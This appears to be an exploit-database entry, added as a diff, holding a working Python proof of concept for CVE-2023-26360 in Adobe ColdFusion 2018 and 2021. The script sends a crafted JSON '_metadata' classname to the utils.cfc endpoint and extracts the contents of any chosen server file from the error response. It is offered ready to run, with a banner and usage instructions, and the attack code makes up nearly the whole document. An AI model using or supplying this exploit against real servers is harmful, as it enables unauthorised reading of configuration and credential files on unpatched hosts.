@@ -1,0 +1,87 @@
+id: 39438
+date: 03/11/2024
+title: Adobe ColdFusion v 2018,15 (and earlier) and 2021,5 and earlier - Arbitrary File Read Exploit
+author: Youssef Muhammad
+cves: CVE-2023-26360
+
+# Exploit Title: File Read Arbitrary Exploit for CVE-2023-26360
+# Exploit Author: [Youssef Muhammad]
+# Vendor Homepage: [
+https://helpx.adobe.com/coldfusion/kb/coldfusion-downloads.html]
+# Software Link: [
+https://drive.google.com/drive/folders/17ryBnFhswxiE1sHrNByxMVPKfUnwqmp0]
+# Version: [Adobe ColdFusion versions 2018,15 (and earlier) and 2021,5 and
+earlier]
+# Tested on: [Windows, Linux]
+# CVE : [CVE-2023-26360]
+
+import sys
+import requests
+import json
+
+BANNER = """
+   ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████   ██████  ██████   ██████   ██████  
+  ██      ██    ██ ██                 ██ ██  ████      ██      ██            ██ ██            ██ ██       ██  ████ 
+  ██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████  ███████   █████  ███████  ██ ██ ██ 
+  ██       ██  ██  ██            ██      ████  ██ ██           ██       ██      ██    ██      ██ ██    ██ ████  ██ 
+   ██████   ████   ███████       ███████  ██████  ███████ ██████        ███████  ██████  ██████   ██████   ██████                                                                                                                                                                                                                                       
+"""
+
+RED_COLOR = "\033[91m"
+GREEN_COLOR = "\032[42m"
+RESET_COLOR = "\033[0m"
+
+def print_banner():
+    print(RED_COLOR + BANNER + "                  Developed by SecureLayer7" + RESET_COLOR)
+    return 0
+
+def run_exploit(host, target_file, endpoint="/CFIDE/wizards/common/utils.cfc", proxy_url=None):
+    if not endpoint.endswith('.cfc'):
+        endpoint += '.cfc'
+
+    if target_file.endswith('.cfc'):
+        raise ValueError('The TARGET_FILE must not point to a .cfc')
+
+    targeted_file = f"a/{target_file}"
+    json_variables = json.dumps({"_metadata": {"classname": targeted_file}, "_variables": []})
+
+    vars_get = {'method': 'test', '_cfclient': 'true'}
+    uri = f'{host}{endpoint}'
+
+    response = requests.post(uri, params=vars_get, data={'_variables': json_variables}, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)
+
+    file_data = None
+    splatter = '<!-- " ---></TD></TD></TD></TH></TH></TH>'
+
+    if response.status_code in [404, 500] and splatter in response.text:
+        file_data = response.text.split(splatter, 1)[0]
+
+    if file_data is None:
+        raise ValueError('Failed to read the file. Ensure the CFC_ENDPOINT, CFC_METHOD, and CFC_METHOD_PARAMETERS are set correctly, and that the endpoint is accessible.')
+
+    print(file_data)
+
+    # Save the output to a file
+    output_file_name = 'output.txt'
+    with open(output_file_name, 'w') as output_file:
+        output_file.write(file_data)
+        print(f"The output saved to {output_file_name}")
+
+if __name__ == "__main__":
+    if not 3 <= len(sys.argv) <= 5:
+        print("Usage: python3 script.py <host> <target_file> [endpoint] [proxy_url]")
+        sys.exit(1)
+
+    print_banner()
+
+    host = sys.argv[1]
+    target_file = sys.argv[2]
+    endpoint = sys.argv[3] if len(sys.argv) > 3 else "/CFIDE/wizards/common/utils.cfc"
+    proxy_url = sys.argv[4] if len(sys.argv) > 4 else None
+
+    try:
+        run_exploit(host, target_file, endpoint, proxy_url)
+    except Exception as e:
+        print(f"Error: {e}")
+
+#  0day.today [2024-03-15]  #
